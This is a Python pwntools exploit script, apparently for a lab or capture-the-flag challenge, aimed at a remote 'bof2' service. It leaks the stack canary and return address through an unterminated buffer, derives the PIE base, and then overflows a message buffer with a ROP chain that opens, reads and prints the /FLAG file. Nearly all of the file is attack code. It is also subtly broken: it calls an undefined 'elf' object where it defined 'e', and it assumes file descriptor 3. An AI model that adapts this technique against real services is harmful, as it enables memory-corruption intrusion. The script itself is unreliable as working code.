#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

# --- Configuration ---
OFFSET_RETURN_SITE_FROM_BASE = 0x9cbc # 您確定的 bof2 返回點偏移
# OFFSET_MSG_FROM_BASE - 不再直接使用，因為我們用ROP

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
# context.log_level = 'debug'

BINARY_NAME = "./bof2" # <--- 請確保這是 Challenge 4 的二進制檔名
try:
    e = ELF(BINARY_NAME) # 使用變數名 'e' 而不是 'elf'
except ELFError:
    log.error(f"Could not load ELF file: {BINARY_NAME}.")
    sys.exit(1)

# --- Connection ---
r = remote('up.zoolab.org', 12344) # Challenge 4 port

leaked_canary = 0
leaked_task_ret_addr = 0 # 指向 main 的返回位址
executable_base = 0

try:
    # --- Stage 1: Unified Leak (Canary, Saved RBP, Return Address fragment) ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30)
    # Canary(rbp-0x8), SavedRBP(rbp), RetAddr(rbp+8)
    # Send 185 'A's to buf1. The 185th 'A' overwrites Canary's LSB (\x00) with 0x41.
    # printf("%s", buf1) will print:
    # "Welcome, " + 185 'A's + 7 MSBs of Canary + 8 bytes of Saved RBP + 6 LSBs of Ret Addr
    # (assuming Saved RBP doesn't have early nulls and Ret Addr's 7th byte is null)

    padding_s1_overwrite_canary_lsb = 185 # (rbp-0x8 from rbp-0xc0 is 184) + 1
    payload_s1_unified_leak = b'A' * padding_s1_overwrite_canary_lsb
    
    r.recvuntil(b"What's your name? ") # This read is for buf1 (rbp-0xc0)
    log.info(f"Unified Leak: Sending {len(payload_s1_unified_leak)} 'A's to buf1...")
    r.send(payload_s1_unified_leak) 

    output_s1 = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    log.info("--- Debugging Unified Leak Output ---")
    log.info(f"Raw output: {repr(output_s1)}")
    
    try:
        welcome_prefix = b"Welcome, "
        idx_after_welcome = output_s1.index(welcome_prefix) + len(welcome_prefix)
        if not output_s1[idx_after_welcome:].startswith(payload_s1_unified_leak):
            raise PwnlibException("Unified leak: Payload 'A's not found after 'Welcome, '")
        
        leak_material_start = idx_after_welcome + len(payload_s1_unified_leak)
        next_prompt_idx = output_s1.index(b"\n", leak_material_start) # Stop at first newline
        leaked_data_chunk = output_s1[leak_material_start:next_prompt_idx]
        log.info(f"Leaked data chunk after {len(payload_s1_unified_leak)} 'A's (len {len(leaked_data_chunk)}): {leaked_data_chunk.hex()}")

        # Expected chunk: 7 Canary MSBs + 8 Saved RBP bytes + 6 Ret Addr LSBs = 21 bytes
        if len(leaked_data_chunk) < 7: # Need at least canary MSBs
            log.error(f"Not enough data leaked for canary. Expected at least 7, got {len(leaked_data_chunk)}")
            raise PwnlibException("Unified leak too short for canary")

        leaked_canary_msbs = leaked_data_chunk[0:7]
        leaked_canary = u64(b'\x00' + leaked_canary_msbs)
        log.success(f"Unified Leak - Reconstructed Canary: {hex(leaked_canary)}")

        if len(leaked_data_chunk) < 7 + 8 + 6: # Check if enough for ret_addr too
            log.warning(f"Leak chunk too short for full ret_addr. Expected at least 21 bytes, got {len(leaked_data_chunk)}. PIE base calculation might fail.")
            # Attempt to get ret_addr even if saved_rbp part is short
            if len(leaked_data_chunk) >= 7 + 8 + 1 : # check if at least 1 byte of ret_addr available
                leaked_ret_addr_lsbs = leaked_data_chunk[7+8 : 7+8+6 if len(leaked_data_chunk)>=(7+8+6) else len(leaked_data_chunk)]
                if len(leaked_ret_addr_lsbs) < 6:
                    log.warning(f"Only {len(leaked_ret_addr_lsbs)} bytes for RetAddr. Padding to 6 with optimism.")
                    leaked_ret_addr_lsbs = leaked_ret_addr_lsbs.ljust(6,b'\xAA') # Pad with dummy byte if too short
                leaked_task_ret_addr = u64(leaked_ret_addr_lsbs + b'\x00\x00')
                log.warning(f"Unified Leak - Constructed Ret Addr (potentially partial/risky): {hex(leaked_task_ret_addr)}")
            else:
                 raise PwnlibException("Unified leak too short for return address fragment")
        else: # Enough data for all parts
            leaked_saved_rbp_bytes = leaked_data_chunk[7:15]
            leaked_saved_rbp = u64(leaked_saved_rbp_bytes)
            log.info(f"Unified Leak - Leaked Saved RBP: {hex(leaked_saved_rbp)}")
            
            leaked_ret_addr_lsbs = leaked_data_chunk[15:21] # 7 (canary) + 8 (saved_rbp) = 15. Next 6 are ret_addr
            leaked_task_ret_addr = u64(leaked_ret_addr_lsbs + b'\x00\x00')
            log.success(f"Unified Leak - Constructed Ret Addr: {hex(leaked_task_ret_addr)}")

        executable_base = leaked_task_ret_addr - OFFSET_RETURN_SITE_FROM_BASE
        e.address = executable_base 
        log.success(f"Calculated executable base: {hex(executable_base)}")

    except Exception as ex_leak:
        log.error(f"Error parsing unified leak: {ex_leak}")
        r.interactive(); sys.exit(1)

    # --- Stage 2: Construct ROP Chain & Overflow local msg buffer ---
    # GDB: buf1(-0xc0), buf2(-0x90), buf3(-0x60), msg(-0x30), Canary(-0x8)
    # The final overflow is on local `msg` buffer (at rbp-0x30).
    # Padding from local `msg` start to canary = (rbp-0x8) - (rbp-0x30) = 0x28 = 40 bytes.
    padding_msg_to_canary = 40
    
    rop = ROP(e)

    # --- ROP Chain Planning ---
    # We need space on the stack for "/FLAG\0" and the read buffer.
    # The ROP chain itself starts at task's old return address slot (rbp+8).
    # RSP at ROP start = (task's old rbp) + 0x10.
    # Let's plan to have "/FLAG\0" and buffer after all gadget addresses and simple args.
    
    # Find a writable area. .bss is good. Or we can use the stack.
    # For stack, addresses will be relative to the ROP chain's starting RSP.
    # Example: If ROP chain + args = 0x50 bytes long.
    # flag_string_on_stack = (initial_rop_rsp) + 0x50
    # read_buffer_on_stack = flag_string_on_stack + 8 (for "/FLAG\0\0\0")
    
    # Using .bss might be simpler if pwntools ROP handles it well.
    # If elf.bss() is, e.g., 0xXXXX0000, then
    flag_str_bss_addr = elf.bss() + 0x200  # Ensure this doesn't conflict with other .bss vars
    read_buf_bss_addr = elf.bss() + 0x200 + 0x20 # Buffer after the string

    log.info(f"ROP: Target for '/FLAG' string in BSS: {hex(flag_str_bss_addr)}")
    log.info(f"ROP: Target for read buffer in BSS: {hex(read_buf_bss_addr)}")

    # 1. read(0, flag_str_bss_addr, 8) ; Read "/FLAG\0\0\0" into BSS
    rop.read(0, flag_str_bss_addr, 8)
    # 2. open(flag_str_bss_addr, O_RDONLY) ; fd in rax
    rop.open(flag_str_bss_addr, constants.O_RDONLY)
    # 3. read(rax, read_buf_bss_addr, 100) ; Read flag content
    #    This needs rax (fd) to be moved to rdi.
    #    pwntools' rop.read() takes fd as first arg.
    #    We need gadgets: pop_rdi_ret, pop_rax_ret, (maybe store rax, then pop to rdi)
    #    This is the tricky part of ROP.
    #    A common pattern is: syscall (open) -> rax=fd. Then if you want to call read(fd, ...):
    #    - Find `pop rdi; ret`
    #    - Find `pop rax; ret` (or way to get value into rax)
    #    - Find `mov rdi, rax; ret` (ideal) OR
    #    - Use stack: `push rax` (if gadget exists), then arrange for `pop rdi`.
    #    For now, we'll try a direct call to read, assuming fd might be small e.g. 3
    log.warning("ROP: Attempting read with assumed fd=3. Robust ROP would use open's rax.")
    rop.read(3, read_buf_bss_addr, 100) # Placeholder fd=3
    # 4. write(1, read_buf_bss_addr, 100) ; Print flag
    rop.write(1, read_buf_bss_addr, 100) # Assume 100 bytes read
    # 5. exit(0)
    rop.exit(0)

    rop_chain_bytes = rop.chain()
    log.info(f"ROP chain generated (length {len(rop_chain_bytes)} bytes)")
    # rop.dump() # for verbose ROP chain

    junk_rbp_final = p64(0x4545454545454545) # 'E'*8
    
    final_payload = b'X' * padding_msg_to_canary # Fill local msg up to canary
    final_payload += p64(leaked_canary)
    final_payload += junk_rbp_final             # Overwrite task's saved RBP
    final_payload += rop_chain_bytes           # ROP chain starts at return address
    
    # Satisfy reads for buf2 and buf3 before the final read into msg
    log.info("Satisfying read into buf2 (room number)...")
    r.sendline(b"Room101") # For buf2 (rbp-0x90)
    
    r.recvuntil(b"What's the customer's name? ")
    log.info("Satisfying read into buf3 (customer's name)...")
    r.sendline(b"CustomerY") # For buf3 (rbp-0x60)

    # Now send the main overflow payload for the 'msg' buffer (rbp-0x30)
    r.recvuntil(b"Leave your message: ")
    log.info(f"Sending final ROP overflow payload ({len(final_payload)} bytes) to local msg buffer...")
    r.send(final_payload) # read(0, msg, 384)
    
    # After sending the ROP chain, the ROP chain's first read(0, flag_str_bss_addr, 8) executes.
    # We need to send "/FLAG\0" for it.
    time.sleep(0.2) # Give a moment for ROP chain to reach the read syscall
    log.info("Sending '/FLAG\\0' for ROP chain's read()...")
    r.send(b"/FLAG\0\0\0") # Send 8 bytes

    log.success("Payloads sent. ROP chain should execute.")
    flag_output = r.recvall(timeout=5.0)
    log.success("--- FLAG ---")
    if flag_output:
        print(flag_output.decode(errors='ignore').strip())
    else:
        log.warning("No flag output received.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
    sys.exit(1) # Exit on PwnlibException to stop script
except Exception as e:
    log.critical(f"An unexpected Python error occurred: {e}")
    import traceback; traceback.print_exc()
finally:
    if r.connected():
        r.close()